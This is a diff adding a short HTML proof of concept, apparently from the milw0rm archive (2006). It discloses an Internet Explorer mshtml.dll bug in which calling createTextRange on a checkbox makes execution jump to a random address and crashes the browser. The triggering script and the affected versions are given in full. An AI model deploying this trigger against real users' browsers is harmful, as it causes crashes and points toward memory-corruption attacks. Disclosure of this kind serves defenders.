@@ -1,0 +1,19 @@
+<!--
+Stelian Ene:
+
+I can't find any info on this delicious IE bug, but it seems to be publicly known:
+
+It will badly access a (virtual?) pointer table, making EIP to jump at a random
+address. This has various effects on the system I've tested with, including
+crashing. It works on these versions of mshtml.dll:
+XP SP2: 6.0.2900.2802 - latest
+WS2003: 6.0.3790.0
+-->
+
+<input type="checkbox" id='c'>
+<script>
+        r=document.getElementById("c");
+        a=r.createTextRange();
+</script>
+
+# milw0rm.com [2006-03-22]
